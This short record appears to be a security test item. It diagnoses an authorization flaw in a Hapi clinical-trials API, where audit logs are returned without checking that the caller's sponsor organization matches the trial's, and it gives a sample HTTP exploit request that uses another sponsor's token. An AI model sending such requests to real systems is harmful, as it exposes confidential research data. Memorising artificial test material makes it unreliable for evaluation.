diagnosis: The audit logs route in Hapi uses an onPreHandler extension that verifies the trial exists, but the handler returns sensitive clinical trial audit logs without verifying that the authenticated researcher's sponsor organization matches the sponsor organization recorded in the trial record.
exploit_request:
GET /api/trials/tr-994102/audit-logs HTTP/1.1
Host: trials.medresearch.org:4000
Authorization: Bearer <sponsor_b_jwt>
Accept: application/json
